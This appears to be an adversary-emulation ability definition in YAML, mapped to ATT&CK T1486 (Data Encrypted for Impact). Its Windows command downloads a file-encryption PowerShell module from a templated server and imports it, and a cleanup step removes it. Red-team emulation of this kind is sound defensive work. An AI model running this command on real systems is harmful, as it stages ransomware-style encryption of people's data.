---

- id: 0353934b-a398-41bb-b55a-7db64dd575ca
  name: Install cryptography module
  description: Install a module for encrypting files
  tactic: impact
  technique:
    attack_id: T1486
    name: Data Encrypted for Impact
  executors:
    windows:
      command: |
        Invoke-WebRequest -Uri #{server}/file/download -Method POST -Headers @{'file'='FileCryptography.psm1'} -OutFile FileCryptography.psm1;
        Import-Module ./FileCryptography.psm1 -Verbose -Force;
      cleanup: |
        Remove-Item FileCryptography.psm1
